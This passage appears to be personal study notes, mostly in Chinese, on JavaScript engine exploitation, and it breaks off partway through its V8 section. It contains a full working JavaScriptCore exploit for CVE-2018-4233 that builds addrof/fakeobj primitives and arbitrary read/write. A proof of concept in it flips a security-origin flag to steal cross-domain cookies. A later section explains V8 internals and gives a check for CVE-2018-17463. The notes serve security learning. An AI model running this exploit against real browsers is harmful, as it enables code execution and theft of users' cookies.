    2. Copy the JSCell header (containing the structure ID) to the
       container object. We've now caused the engine to "forget" about the
       properties of the container object that make up our fake array.

    3. Set the butterfly pointer of the fake array to nullptr, and, while
       we're at it also replace the JSCell of that object with one from a
       default Float64Array instance

The last step is required since we might end up with the structure of a
Float64Array with some property due to our structure spraying before.



#### CVE-2018-4233 (WebKit-RegEx-Exploit) analyze / isexploit

`addrof`：

```js
function addrof(val) {
    var array = [13.37]; // create array
    var reg = /abc/y; // create regular expression

    // y for sticky:
    // The sticky property reflects whether or not the search is sticky,
    // (searches in strings only from the index indicated by the lastIndex property
    // of this regular expression). sticky is a read-only property of
    // an individual regular expression object
    
    // Target function
    var AddrGetter = function(array) {
        "abc".match(reg); // original: reg[Symbol.match]();
        return array[0];
        /* when it's jited, it will return double value (because of array[0]),
         * but jit doesn't check if array[0] is still a double
         */
    }
    
    // Force optimization
    // JIT it !
    for (var i = 0; i < 10000; ++i)
        AddrGetter(array);
    
    // Setup haxx
    // Update array[0] to our target object when regex do lastIndex()
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = val; // set the first element to an object
        return "0";
    };
    reg.lastIndex = regexLastIndex;
    
    // Do it!
    // return first element of array
    return AddrGetter(array);
    // lastIndex is an object ??! We need to get number from call lastIndex.toString() !
    // Oh! I get "0" and the lastIndex must be 0 --> trigger exp
}

meow = {}
print(describe(meow))
print(addrof(meow))
```

在執行 `JSC_reportDFGCompileTimes=true ./jsc ./pwn.js` 的過程中，第一次的 iteration 會有兩次的 optimization 以及 failed，而他在內部做了兩次 optimization

- to DFG
- to FTL

而在第二次的 iteration，成功印出 address，不過 optimization 只有 to DFG，因此如果降低 force JIT 的迴圈數，就能確保不會到 FTL，至此 exploit 100% 成功。

接著執行 `JSC_dumpSourceAtDFGTime=true ./jsc ./pwn.js` 分析 DFG 內部優化究竟做了些什麼：

```
[1] Compiled AddrGetter#EmYVxR:[0x109850230->0x1098fcf20, BaselineFunctionCall, 46]
'''function AddrGetter(array) {
    "abc".match(reg); // original: reg[Symbol.match]();
        return array[0];
        /* when it's jited, it will return double value (because of array[0]),
         * but jit doesn't check if array[0] is still a double
         */
    }'''
```

- 這邊指出要 optimize 哪個部分

```
[2] Inlined match#DLDZSb:[0x109850460->0x1098fd080, BaselineFunctionCall, 112 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGetter#EmYVxR:[0x109850af0->0x10985
0230->0x1098fcf20, DFGFunctionCall, 46] bc#33
'''function match(regexp)
{
    "use strict";

    if (this == null)
        @throwTypeError("String.prototype.match requires that |this| not be null or undefined");

    if (regexp != null) {
        var matcher = regexp.@matchSymbol; // <--- do this
        if (matcher != @undefined)
            return matcher.@call(regexp, this);
    }

    let thisString = @toString(this);
    let createdRegExp = @regExpCreate(regexp, @undefined);
    return createdRegExp.@matchSymbol(thisString);
}'''
```

- 這邊是 `match()` 的程式邏輯，由於 regexp 不為 null，會執行 `regexp.@matchSymbol`

```
[3] Inlined [Symbol.match]#BFrWhl:[0x109850690->0x1098b9130, BaselineFunctionCall, 119 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGetter#EmYVxR:[0x109850af0
->0x109850230->0x1098fcf20, DFGFunctionCall, 46] bc#52
'''function [Symbol.match](strArg)
{
    "use strict";

    if (!@isObject(this))
        @throwTypeError("RegExp.prototype.@@match requires that |this| be an Object");

    let str = @toString(strArg);

    //
    if (!@hasObservableSideEffectsForRegExpMatch(this)) // 這邊會檢查是否有 side effect
        return @regExpMatchFast.@call(this, str);
    return @matchSlow(this, str);
}'''
```

- MatchSymbol 會執行 `[Symbol.match](strArg)`，有點怪的 function define
  - js 會執行 `@overriddenName="[Symbol.match]"` 改掉 function name，該 function 原本也叫做 `match()`
- 如果有 side effect 就走 `MatchSlow()`，沒有就走 `Fast.@call`

```
[4] Inlined hasObservableSideEffectsForRegExpMatch#DSRdGE:[0x1098508c0->0x1098bb2e0, BaselineFunctionCall, 106 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGe
tter#EmYVxR:[0x109850af0->0x109850230->0x1098fcf20, DFGFunctionCall, 46] bc#49
'''function hasObservableSideEffectsForRegExpMatch(regexp)
{
    "use strict";

    //
    let regexpExec = @tryGetById(regexp, "exec");
    if (regexpExec !== @regExpBuiltinExec)
        return true;

    let regexpGlobal = @tryGetById(regexp, "global");
    if (regexpGlobal !== @regExpProtoGlobalGetter)
        return true;
    let regexpUnicode = @tryGetById(regexp, "unicode");
    if (regexpUnicode !== @regExpProtoUnicodeGetter)
        return true;

	// patch commit 改成:
	// return typeof regexp.lastIndex !== "number";
	
    return !@isRegExpObject(regexp);
}'''
```

- 這裡檢查是否有 side effect

在 DFG 執行 opcode 時 (Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h)：

```c++
...
2230     case RegExpTest:
2231         // Even if we've proven known input types as RegExpObject and String,
2232         // accessing lastIndex is effectful if it's a global regexp.
2233         clobberWorld();
2234         setNonCellTypeForNode(node, SpecBoolean);
2235         break;
2236
2237     case RegExpMatchFast:
2238         ASSERT(node->child2().useKind() == RegExpObjectUse);
2239         ASSERT(node->child3().useKind() == StringUse || node->child3().useKind() == KnownStringUse);
2240         setTypeForNode(node, SpecOther | SpecArray);
2241         break;
...
```

可以看到 `RegExpTest` 有一則註解，說明 lastIndex 可能會發生問題，不過在 `RegExpMatchFast` 也沒有對資料做更深入的檢查，最後的修補方式是在 `hasObservableSideEffectsForRegExpMatch` 加上更多的檢查，不讓 `RegExpMatchFast `被執行到而走 slow path。



`fakeobj`:

```js
function fakeobj(dbl) {
    var array = [13.37];
    var reg = /abc/y;

    var AddrSetter = function(array) {
        "abc".match(reg);
        array[0] = dbl; // type confusion
    }
    
    for (var i = 0; i < 10000; ++i)
        AddrSetter(array);
    
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = {};
        return "0";
    };
    reg.lastIndex = regexLastIndex;

    AddrSetter(array);
    return array[0]
}
```

- 類似的 payload，不過 `toString()` 換成是將 `array[0]` assign 成 object，並在 JIT code 當中 assign 成傳入的 double value
- 在 `toString()` 時會將原本的 array 從 `ArrayWithDouble` 轉為 `ArrayWithContiguous`，但因為 JIT code 並不會做 type casting，因此 `array[0] = dbl` 會覆蓋掉原本的 pointer 成我們輸入的 double value

```js
fake = {}
// struct.unpack("d", struct.pack("Q", 0x0100160000001000-2**48))
// 2*48 --> for double value encode, but JIT code will not to substract 2**48 (?)
fake.a = 7.082855106403439e-304
fake.b = 2
fake.c = 1337
delete fake.b // set 0
print(addrof(fake))
/* (In python) hax_addr = struct.unpack("Q", struct.pack("d", <address_u_got> + 0x10))
 * hax = fakeobj(hax_addr)
 * describe(hax)
 */
```

- 在 assign pointer 時，double value 會被 encode，方式為額外加上 `2**48` ，因此在 assign 時必須要扣掉 `2**48`
  - 而該情況是在存入的 value type 是 JSCValue 時才會 encode (Array 中有除了 Double 的 type)，如果是純 Double Array 就不用 encode，因此也不用減去 `2**48`
- `delete <var>` 可以讓 `var` 對應的記憶體空間被清為 0
- 到此，可以構造出任意的 JS object，不過要構造出怎樣的 object 才能做到 arbitrary code execution？ 

Linus 在找 structure ID 的方法並非 spray，而是透過 increment struct ID 以及用 `instanceof ` 來檢查是否為 target structure：

```js
while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
    jsCellHeader.assignAdd(jsCellHeader, Int64.One);
    wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
}
```

在用 `new BufferArray()` 建立新的 array，並透過 `u32 = new Uint32Array(buf)` 以及 `f64` version，就能直接對 pointer 做操作，不用再透過手動用 python 做 cast:

```js
fake = {}
fake.a = 7.082855106403439e-304
fake.b = 2
fake.c = 1337
delete fake.b // set 0
fake_addr = addrof(fake)
f64[0] = fake_addr
u32[0] += 0x10
hax_addr = f64[0]
hax = fakeobj(hax_addr)
```



而 [Niklas 的 exploit](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html) 利用不同的方式實作了更 powerful 的 `addrof` 以及 `fakeobj` (?)，不過步驟複雜，建議是參考 LiveOverflow 的[說明](https://liveoverflow.com/preparing-for-stage-2-of-a-webkit-exploit/)



https://liveoverflow.com/content/images/2019/07/ov3.gif

Ref to LiveOverflow



1. 建立 ArrayWithContiguous type 的 fake object：

   ```js
   // spray for structureID
   // the type of structure_spray is ArrayWithContiguous
   var structure_spray = [];
   for (var i = 0; i < 1000; i++) {
       var array = [13.37];
       array.a = 13.37;
       array['prop' + i] = 13.37;
       structure_spray.push(array)
   }
   // the type of victim is ArrayWithDouble
   var victim = structure_spray[510];
   
   u32[0] = 0x200; // for structureID
   u32[1] = 0x01082007 - 0x10000 // why sub 0x10000?
   var flags_double = f64[0]
   u32[1] = 0x01082009 - 0x10000
   var flags_cont = f64[0]
   
   // NonArray (inline properties)
   var outer = {
       cell_header: flags_cont,
       butterfly: victim,
   }
   
   f64[0] = addrof(outer)
   u32[0] += 0x10
   var hax = fakeobj(f64[0])
   ```

   - 由於 butterfly 指向 victim (實際上是 victim 的 metadata)，因此 hax 可以更動到 victim 的 metadata (cell_header + butterfly)，像是 `hax[0]` 就會是 victim 的 cell_header、`hax[1]` 會是 victim 的 butterfly

2. 構造 boxed / unboxed 擁有相同 butterfly，用 unboxed assign 位置，在用 boxed 作為 pointer 任意存取；也能用 boxed 指向某個 object，並透過 unboxed 讀取 address：

   ```js
   var unboxed_size = 10
   // CopyOnWriteArrayWithDouble
   var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`)
   unboxed[0] = 13.337 // not we need ArrayWithDouble
   
   var boxed = [{}] // JSCValue
   
   hax[1] = unboxed // change victim butterfly to unboxed metadata
   var tmp_butterfly = victim[1] // get unboxed butterfly
   
   hax[1] = boxed // change victim butterfly to unboxed metadata
   // set boxed butterfly to tmp_butterfly, which is shared with unboxed
   victim[1] = tmp_butterfly
   
   // the idea is same as original reg bug
   
   stage2_addrof = function (obj) {
       boxed[0] = obj;
       return unboxed[0];
   }
   
   stage2_fakeobj = function (addr) {
       unboxed[0] = addr;
       return boxed[0];
   }
   ```

3. 任意讀 / 任意寫並不需要 powerful addrof / fakeobj，只需要使用第一階段的 addrof / fakeobj 即可：

   ```js
   outer.cell_header = flags_double
   read64 = function(where) {
       f64[0] = where;
       u32[0] += 0x10; // .a offset is -0x10
       hax[1] = f64[0];
       return victim.a;
   }
   
   write64 = function(where, what) {
       f64[0] = where;
       u32[0] += 0x10; // .a offset is -0x10
       hax[1] = f64[0];
       victim.a = what;
   }
   ```



最後攻擊方法有許多種：

- 下載 JIT 並且執行，在得到 JIT function 後拿到其 address，由於是 rwx，因此將 JIT 內容蓋寫成 shellcode 即可

  - 不過並不是每個 Webkit 都會有 JIT

- 找到 stack 並蓋寫 return address 成 ROP

- 蓋寫用於避免 XSS 攻擊的 `securityPolicy`，以下 POC 參考原作者的 exploit：

  ```js
  var jsxhr = new XMLHttpRequest();
  var jsxhrAddr = stage2.addrof(jsxhr);
  var xhrAddr = stage2.read64(jsxhrAddr + 0x18);
  var scriptExecContextAddr = stage2.read64(xhrAddr + 0x68);
  var securityOriginPolicyAddr = stage2.read64(scriptExecContextAddr + 8);
  var securityOriginAddr = stage2.read64(securityOriginPolicyAddr + 8);
  
  // m_universalAccess flag is at +0x31, set it to 1
  var flags = stage2.read64(securityOriginAddr + 0x30);
  stage2.write64(securityOriginAddr + 0x30, flags + 0x0100);
  ```

  - 存取到其他 domain 的 cookies



最後 LiveOverflow 提出關於大家都使用 `addrof` 以及 `fakeobj` 作為 exploit primitive 的論點，除了可以構造任意的 JS object 之外，這個方法屬於 **reusable**，考慮到一些 exploit 在做 `gc()` 等操作時並會造成 memory corruption，如果我們找到新的 vuln 可以構造出 `addrof` 以及 `fakeobj`，就可以直接使用過去的 memory safe exploit

- 只需要在新的 vuln 弄到 `addrof()` 以及 `fakeobj()`，其他 exploit 都可以 reuse
- Steps
  1. bug
  2. `addrof` / `fakeobj`
  3. arbitrary r/w
  4. (memory clean)
  5. do stuff ...



最終的 exploit (到 arbitrary r/w)：

```js
function addrof(val) {
    var array = [13.37]; // create array
    var reg = /abc/y; // create regular expression

    // y for sticky:
    // The sticky property reflects whether or not the search is sticky,
    // (searches in strings only from the index indicated by the lastIndex property
    // of this regular expression). sticky is a read-only property of
    // an individual regular expression object
    
    // Target function
    var AddrGetter = function(array) {
        "abc".match(reg); // original: reg[Symbol.match]();
        return array[0];
        /* when it's jited, it will return double value (because of array[0]),
         * but jit doesn't check if array[0] is still a double
         */
    }
    
    // Force optimization
    // JIT it !
    for (var i = 0; i < 10000; ++i)
        AddrGetter(array);
    
    // Setup haxx
    // Update array[0] to our target object when regex do lastIndex()
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = val; // set the first element to an object
        return "0";
    };
    reg.lastIndex = regexLastIndex;
    
    // Do it!
    // return first element of array
    return AddrGetter(array);
    // lastIndex is an object ??! We need to get number from call lastIndex.toString() !
    // Oh! I get "0" and the lastIndex must be 0 --> trigger exp
}


function fakeobj(dbl) {
    var array = [13.37];
    var reg = /abc/y;

    var AddrSetter = function(array) {
        "abc".match(reg);
        array[0] = dbl; // type confusion
    }
    
    for (var i = 0; i < 10000; ++i)
        AddrSetter(array);
    
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = {};
        return "0";
    };
    reg.lastIndex = regexLastIndex;

    AddrSetter(array);
    return array[0]
}

for (var i = 0; i < 0x1000; i++) {
    spray = {}
    spray.x = 1
    spray['prop_' + i] = 2
}

buf = new ArrayBuffer(8);
u32 = new Uint32Array(buf);
f64 = new Float64Array(buf);

// spray for structureID
// the type of structure_spray is ArrayWithContiguous
var structure_spray = [];
for (var i = 0; i < 1000; i++) {
    var array = [13.37];
    array.a = 13.37;
    array['prop' + i] = 13.37;
    structure_spray.push(array)
}

/* ---------------- stage 1 ---------------- */
// the type of victim is ArrayWithDouble
var victim = structure_spray[510];

u32[0] = 0x200; // for structureID
u32[1] = 0x01082007 - 0x10000 // why sub 0x10000?
var flags_double = f64[0]
u32[1] = 0x01082009 - 0x10000
var flags_cont = f64[0]

// NonArray (inline array)
var outer = {
    cell_header: flags_cont,
    butterfly: victim,
}

f64[0] = addrof(outer)
u32[0] += 0x10
var hax = fakeobj(f64[0])

/* ---------------- stage 2 ---------------- */
var unboxed_size = 10
// CopyOnWriteArrayWithDouble
var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`)
unboxed[0] = 13.337 // not we need ArrayWithDouble

var boxed = [{}] // JSCValue

hax[1] = unboxed // change victim butterfly to unboxed metadata
var tmp_butterfly = victim[1] // get unboxed butterfly

hax[1] = boxed // change victim butterfly to unboxed metadata
// set boxed butterfly to tmp_butterfly, which is shared with unboxed
victim[1] = tmp_butterfly

// the idea is same as original reg bug

stage2_addrof = function (obj) {
    boxed[0] = obj;
    return unboxed[0];
}

stage2_fakeobj = function (addr) {
    unboxed[0] = addr;
    return boxed[0];
}

outer.cell_header = flags_double
read64 = function(where) {
    f64[0] = where;
    u32[0] += 0x10; // .a offset is -0x10
    hax[1] = f64[0];
    return victim.a;
}

write64 = function(where, what) {
    f64[0] = where;
    u32[0] += 0x10; // .a offset is -0x10
    hax[1] = f64[0];
    victim.a = what;
}
```



資料參考來源：

- [phrack](http://phrack.org/papers/attacking_javascript_engines.html)
- [LiveOverflow](https://liveoverflow.com/topic/browser-exploitation/)
- [WebKit-RegEx-Exploit](https://github.com/LinusHenze/WebKit-RegEx-Exploit)

其他學習資源 (引用 LiveOverflow)：

**JavaScriptCore** - Here are my reasons why I chose this engine.

- [saelo's exploit for CVE-2018-4233](https://github.com/saelo/cve-2018-4233)
  - another implementation by Niklas B - [regexp](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html)
- [Zero Day Initiative](https://twitter.com/thezdi) - [blog post](https://www.zerodayinitiative.com/blog/2019/3/14/the-apple-bug-that-fell-near-the-webkit-tree)

CVE 分析：

- [CVE-2016-4622](https://zhuanlan.zhihu.com/p/127115854)





### V8 & CVE-2018-17463

http://phrack.org/papers/jit_exploitation.html

ubuntu 18.04：

```bash
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH=/root/depot_tools:$PATH

cd depot_tools
mkdir v8 && cd v8
fetch v8
git checkout 568979f4d891bafec875fab20f608ff9392f4f29
gclient sync
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
```



POC:

```js
function check_vul(){
    function bad_create(x){
        x.a;
        Object.create(x);
        return x.b;

    }

    for (let i = 0;i < 10000; i++){
        let x = {a : 0x1234};
        x.b = 0x5678; 
        let res = bad_create(x);
        if( res != 0x5678){
            console.log(i);
            console.log("CVE-2018-17463 exists in the d8");
            return;
        }

    }
    throw "bad d8 version";
}
check_vul();
```



**V8 介紹**

V8 有各式各樣的 feature，其中許多都有大量的文件可以查閱，幾個特別的 feature 為：

- 一堆 builtin functions
  - 執行 d8 (v8's JavaScript shell) 時加上  `--allow-natives-syntax`  flag，就能使用：
    -  `%DebugPrint` - 印出 object 詳細的資訊
    -  `%CollectGarbage` - force gc
    -  `%OptimizeFunctionOnNextCall` - force JIT
- 很多 trace mode 的 flag 可以用，像是產生 trace call 的圖，`./d8 --help` 能看到一堆
- 在 `tools/` 底下有很多 script 可以用，或是 visualizer of the JIT IR called turbolize
  - `tools/gdbinit` 為 v8 的 gdb script



[src/objects.h](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.h;l=6;drc=7fc1bf7f07dacab1be87c6fde304750df5b7d4cd?q=objects.h&sq=) 定義了許多 JS value type：

```js
// Inheritance hierarchy:
// - Object
//   - Smi          (immediate small integer)
//   - TaggedIndex  (properly sign-extended immediate small integer)
//   - HeapObject   (superclass for everything allocated in the heap)
//     - JSReceiver  (suitable for property access)
//       - JSObject
//         - JSArray
//         - JSArrayBuffer
//         - JSArrayBufferView
//           - JSTypedArray
//           - JSDataView
...
```

其中 64-bit 的 object 使用 tag scheme：

```
Smi:        [32 bit signed int] [31 bits unused] 0
HeapObject: [64 bit direct pointer]              | 01
```

而 object 的更多資訊可以在 object 的 offset 0 找到指向 map instance 的 pointer 。



map 在 v8 當中極為重要，包含了以下資訊：

- The **dynamic type** of the object, i.e. String, Uint8Array, HeapNumber, ...
- The **size** of the object in bytes
- The **properties** of the object and **where they are stored**
  - property name 存在 map，而 property value 存在 object
  - 通常會有三個地方存 property value：
    - inside the object itself (**inline** properties)
    - in a separate, **dynamically sized** **heap** buffer (**out-of-line** properties)
    - if property name is an **integer index**, as array elements in a
      **dynamically-sized heap array**
- The **type of the array elements**, e.g. **unboxed doubles** or **tagged pointers**
- The **prototype** of the object if any

跟 JSC 的 structure 基本上是一樣的概念，而舉例來說：

```js
let o1 = {a: 42, b: 43};
let o2 = {a: 1337, b: 1338};
```

會產生兩個 JSObject：

```
                      +----------------+
                      |                |
                      | map1           |
                      |                |
                      | property: slot |
                      |      .a : 0    |
                      |      .b : 1    |
                      |                |
                      +----------------+
                          ^         ^
    +--------------+      |         |
    |              +------+         |
    |    o1        |           +--------------+
    |              |           |              |
    | slot : value |           |    o2        |
    |    0 : 42    |           |              |
    |    1 : 43    |           | slot : value |
    +--------------+           |    0 : 1337  |
                               |    1 : 1338  |
                               +--------------+
```

如果此時 `o1` 新增一個 property `.c`，會變成：

```
       +----------------+       +----------------+
       |                |       |                |
       | map1           |       | map2           |
       |                |       |                |
       | property: slot |       | property: slot |
       | .a      : 0    |       | .a      : 0    |
       | .b      : 1    |       | .b      : 1    |
       |                |       | .c      : 2    |
       +----------------+       +----------------+
               ^                        ^
               |                        |
               |                        |
        +--------------+         +--------------+
        |              |         |              |
        |    o2        |         |    o1        |
        |              |         |              |
        | slot : value |         | slot : value |
        |    0 : 1337  |         |    0 : 1337  |
        |    1 : 1338  |         |    1 : 1338  |
        +--------------+         |    2 : 1339  |
                                 +--------------+
```

如果待會 `o2` 也新增了  `.c`，`o1` 跟 `o2` 會再一次 share 同個 map (`map2`)，而 v8 就是持續不斷 track 每個新增 property 的 map。V8 還能夠將 properties 存成 hash map 而不是用  map / slot，在這個情況下 name 就**直接**被 mapped 到 value，這個機制在 engine 相信 Map 會有額外的 overhead，像是 singleton objects。

實際測試一下：

```js
let obj = {
	x: 0x41,
    y: 0x42
};
obj.z = 0x43;
obj[0] = 0x1337;
obj[1] = 0x1338;
%DebugPrint(obj)
```

`DebugPrint()` 的輸出結果：

```
DebugPrint: 0x3f2f2d0e1b9: [JS_OBJECT_TYPE]
 - map: 0x220dc388ca21 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3685155046d9 <Object map = 0x220dc38822f1>
 - elements: 0x03f2f2d0e2f9 <FixedArray[17]> [HOLEY_ELEMENTS]
 - properties: 0x03f2f2d0e2d1 <PropertyArray[3]> {
    #x: 65 (data field 0)
    #y: 66 (data field 1)
    #z: 67 (data field 2) properties[0]
 }
 - elements: 0x03f2f2d0e2f9 <FixedArray[17]> {
           0: 4919
           1: 4920
        2-16: 0x0a0ac5982681 <the_hole>
 }
0x220dc388ca21: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 40
 - inobject properties: 2
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 2
 - enum length: invalid
 - stable_map
 - back pointer: 0x220dc388c9d1 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x368515506459 <Cell value= 0>
 - instance descriptors (own) #3: 0x03f2f2d0e269 <DescriptorArray[11]>
 - layout descriptor: (nil)
 - prototype: 0x3685155046d9 <Object map = 0x220dc38822f1>
 - constructor: 0x368515504711 <JSFunction Object (sfi = 0x13d0e6e8f991)>
 - dependent code: 0x0a0ac5982391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

{0: 4919, 1: 4920, x: 65, y: 66, z: 67}
```

`obj` 的位置為 `0x3f2f2d0e1b9 - 1`，同時也包含 inline properties，有一開始的 `.x` --> `0x41` 以及 `.y` -->  `0x42`：

```
pwndbg> x/10gx 0x3f2f2d0e1b9 - 1
0x3f2f2d0e1b8:	0x0000220dc388ca21	0x000003f2f2d0e2d1
0x3f2f2d0e1c8:	0x000003f2f2d0e2f9	0x0000004100000000
0x3f2f2d0e1d8:	0x0000004200000000	0x00000a0ac5982341
...
```

- map 在第一個 8 bytes - `0x220dc388ca21 - 1`

  ```
  pwndbg> x/10gx 0x220dc388ca21 - 1
  0x220dc388ca20:	0x00000a0ac5982251	0x1900042116020305
  0x220dc388ca30:	0x0000000008200c03	0x00003685155046d9
  0x220dc388ca40:	0x0000220dc388c9d1	0x0000000000000000
  0x220dc388ca50:	0x000003f2f2d0e269	0x0000000000000000
  0x220dc388ca60:	0x00000a0ac5982391	0x0000368515506459
  ```

- 第二個 8 bytes 為 `out-of-line properties` pointer，內容存放  `.z` 的 0x43 - `0x000003f2f2d0e2d1 - 1`

  ```
  pwndbg> x/10gx 0x000003f2f2d0e2d1 - 1
  0x3f2f2d0e2d0:	0x00000a0ac5983899	0x0000000300000000
  0x3f2f2d0e2e0:	0x0000004300000000	0x00000a0ac59825a1
  0x3f2f2d0e2f0:	0x00000a0ac59825a1	0x00000a0ac5982881
  ...
  ```

  - 第一個 8 bytes 同樣為 map pointer；第二個 8 bytes 為 size

- 第三個 8 bytes 為 `element` pointer，也就是 integer index，包含 `0x1337`, `0x1338` - `0x000003f2f2d0e2f9 - 1`

  ```
  pwndbg> x/10gx 0x000003f2f2d0e2f9 - 1
  0x3f2f2d0e2f8:	0x00000a0ac5982881	0x0000001100000000
  0x3f2f2d0e308:	0x0000133700000000	0x0000133800000000
  0x3f2f2d0e318:	0x00000a0ac5982681	0x00000a0ac5982681
  ...
  ```

  - 前 8 bytes 也是 map pointer，第二個 8 bytes 則是 capacity
  - `0x00000a0ac5982681` 為 the_hole，代表該空間為 overcommit

每個 object 結構都用 map 來表示，意味著 map 的 reuse。



**JIT**

v8 內部的 JIT compiler 使用的是 [turbofan](https://v8.dev/docs/turbofan)，而關於 JIT，當一段程式碼非常 **hot**，代表一直被執行到，v8 內部會透過 JIT 將其編譯成 native code，像是：

```js
function add(a, b) {
	return a + b;
}
```

如果 a b 每次都傳入 integer，**可能**就會被優化成 (可能需考慮到其他因素)：

```asm
lea eax, [rdi + rsi]
ret
```

但是優化的前提是假設 a b 都是 integer，如果今天傳入的是 float 甚至是 pointer，可能就會發生錯誤 (或是有漏洞)，或者是有 overflow 的情況發生。因此實際上產生出來的 machine code 會有額外的檢查，如 type checking、map checking 或是 overflow checking，像是：

```asm
lea     rax, [rdi+rsi]
jo      bailout_integer_overflow # overflow checking
ret

; Ensure is Smi
test    rdi, 0x1
jnz     bailout # type checking

; Ensure has expected Map
cmp    QWORD PTR [rdi-0x1], 0x12345601
jne    bailout # map checking
```

通常 JIT compiler 能得到的資訊只有先前的執行結果，並且轉出來的 native code 必須要快，又能要保證不會出狀況，而那些檢查稱作 **speculation guard**，並會用 bailout 的機制來 handle 預測失敗的情況，這些 **speculation guard** 必須處理在 interpreter time 會有，但是 native code 沒有的 informartion：

1. Gather **type profiles** during execution in the interpreter
2. Speculate **that the same types** will be used in the future
3. **Guard those speculations** with runtime speculation guards
4. Afterwards, produce **optimized code** for the previously seen types



雖然使用者的 JavaScript code 會在內部被 interpreter 轉乘 bytecode，但是 JIT compilers 還是會產生 custom intermediate representation (IR) 來方便做 optimize。而 turbofan 的 IR 為 graph-based，由 operations (nodes) 以及
different types of edges 所組成：

- control-flow edges - connecting **control-flow operations** such as **loops** and **if** conditions
- data-flow edges - connecting **input and output** values
- effect-flow edges - which connect **effectual operations** such that they are scheduled correctly
  - For example: consider a store to a property followed by **a load of the same property**. As there is **no data- or control-flow dependency** between the **two operations**, effect-flow is needed to **correctly schedule the store before the load**

Turbofan IR support 三種不同的 operation：

- JavaScript operations
  - resemble a generic **bytecode instruction**
- simplified operations
  - 介在中間？
- machine operations
  - resemble a single **machine instruction**

可以使用 v8's turbolizer tool (執行時加上 flag `--trace-turbo`) 來幫助觀察 JIT 的運作。

1. **Graph building and specialization**
   - the bytecode as well as **runtime type profiles from the interpreter** are consumed and an **IR graph**,
     representing the same computations, is constructed
   - Type profiles are inspected and based on them **speculations** are **formulated**, e.g. about which types of values to see for an operation
   - The speculations are guarded with **speculation guards**
2. **Optimization**
   - the resulting graph, which now has **static type information** due to the **guards**, is optimized much like "**classic**" **ahead-of-time (AOT)** compilers do
   - Here an optimization is defined as a **transformation of code** that is not required for correctness but
     improves the execution speed or memory footprint of the code. Typical optimizations include **loop-invariant code motion**, **constant folding**, **escape analysis**, and **inlining**
     - loop-invariant - 將循環不變的語句或表達式移到循環體之外，而不改變程序的語義
3. **Lowering**
   - finally, the resulting graph is lowered to **machine code** which is then written into an **executable memory region**
   - From that point on, invoking the compiled function will result in a **transfer of execution to the generated code**

而過去的執行狀態都會儲存在 feedback vector of the function，其中會觀察執行 function 時的 input type





當 turbofan 開始 compiling，會先建立一個 JavaScript code 的 graph representation，同時檢查 feedback vector，基於觀察結果來預測 function 被呼叫時傳入的 object 其 Map，並且建置兩個 runtime check assumptions，如果失敗就會 **bail out** 給 interpreter。而之後會從 inline property 執行 property load，optimized graph 會長得像 (data-flow edges only)：

```
        +----------------+
        |                |
        |  Parameter[1]  |
        |                |
        +-------+--------+
                |                   +-------------------+
                |                   |                   |
                +------------------->  CheckHeapObject  |
                                    |                   |
                                    +----------+--------+
          +------------+                       |
          |            |                       |
          |  CheckMap  <-----------------------+
          |            |
          +-----+------+
                |                   +------------------+
                |                   |                  |
                +------------------->  LoadField[+32]  |
                                    |                  |
                                    +----------+-------+
           +----------+                        |
           |          |                        |
           |  Return  <------------------------+
           |          |
           +----------+
```

- lower to machine code likes:

  ```asm
  ; Ensure o is not a Smi
  test    rdi, 0x1
  jz      bailout_not_object
  
  ; Ensure o has the expected Map
  cmp     QWORD PTR [rdi-0x1], 0xabcd1234 # 0xabcd1234 為指定的 map ptr
  jne     bailout_wrong_map
  
  ; Perform operation for object with known Map
  mov     rax, [rdi+0x1f]
  ret
  ```

- 當 different map 傳入，會觸發 `bailout`，執行流程交給 interpreter (實際上會執行 bytecode 的 `LdaNamedProperty`)，其中可能會 discard compiled code，也有可能轉成 **polymorphic property load** 的模式，也就是多種 input type，也有可能 recompile 成新傳入的 type

  - 如果選過於複雜，可能會用 **inline cache (IC)**
  - IC caches **previous lookups** but can always **fall-back to the runtime function** for previously unseen input types **without bailing out of the JIT code**
  - 上個沒看過的 type 會直接執行 runtime function 而非走 JIT code，並且 JIT code 不會被 discard

而 JIT code 的 bug 來源有許多種：

- bounds-check elimination (多)
- escape analysis
- register allocation
- integer overflow
- redundancy elimination 

而在找 JIT 的洞時，最好先決定要找哪一種洞，除了有明確方向外，也可以對該漏洞的 exploit 更加熟悉。



在 bug 當中，**remove safety checks** (Redundancy Elimination) 也很常見，舉例來說：

```js
function foo(o) {
	return o.a + o.b;
}
```

 轉成 bytecode 後會像是：

```
CheckHeapObject o
CheckMap o, map1
r0 = Load [o + 0x18]

CheckHeapObject o
CheckMap o, map1
r1 = Load [o + 0x20]

r2 = Add r0, r1
CheckNoOverflow
Return r2
```

可以發現這邊會有兩個 `CheckHeapObject()`，基本上在**極大多數**情況下兩個 `Load` 中間是不會有 type 的變化的，因此可以看成第二個檢查是 redundant。但是有 operation 會有 side-effect 如改變 context，而最簡單的例子為在 check 中間呼叫 function 來改變 map 的結構 (新增 / 刪除 property)。



**CVE analyze**

IR operations 會有不同的 flags 代表不同的 attribute，其中一個是 `kNoWrite`，代表 engine 認為這個 operation 不會有其他的 side-effect (因為不會修改到任何數值)，舉例來說像是 `CACHED_OP_LIST()`：

```cpp
#define CACHED_OP_LIST(V)                                            \
      ...                                                                \
      V(CreateObject, Operator::kNoWrite, 1, 1)                          \
